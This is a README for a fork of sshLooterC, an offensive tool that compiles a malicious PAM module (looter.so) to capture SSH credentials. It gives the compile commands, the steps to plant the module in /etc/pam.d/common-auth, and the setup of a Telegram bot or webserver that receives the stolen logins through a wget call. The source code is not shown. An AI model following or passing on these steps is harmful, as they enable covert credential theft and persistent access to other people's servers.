# sshLooterC forked
<pre>
<a href="https://github.com/mthbernardes/sshLooterC">
https://github.com/mthbernardes/sshLooterC</a>
</pre>
# Changes from the original project
* Removed libcurl4-openssl-dev dependency, now using system("wget ...")
* Compiled for 32bit arch, should work for 64bit as well, 
you need to install gcc-multilib on the attacker machine.
I have coded a C file (callLooter) to test the library before installation.
</pre>

# Compilation
<pre>
 gcc callLooter.c -o callLooter -m32 -ldl
 gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter.c
The m32 switch is optional and allows to compile the files for a 32bit arch
</pre>


# Install and configuration
<pre>
See the original project
</pre>

# Note on Telegram configuration
<pre>
Install a client (mobile or desktop), request a new bot @botfather, 
then ask @userinfobot to get your user id to be used in conjunction with the bot API key.
Alternatively you can expose your logic on a webserver to read the query string with 
the leaked data and change the wget URL in looter.c
</pre>

# Usage
<pre>
See the original project, please note that you have to modify the <b>/etc/pam.d/common-auth</b> file 
inserting <b>looter.so</b>, according to the compilation instructions
</pre>

# Credits
<a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank">Stealing SSH credentials Another Approach.</a>
<br/>
Thank you

 
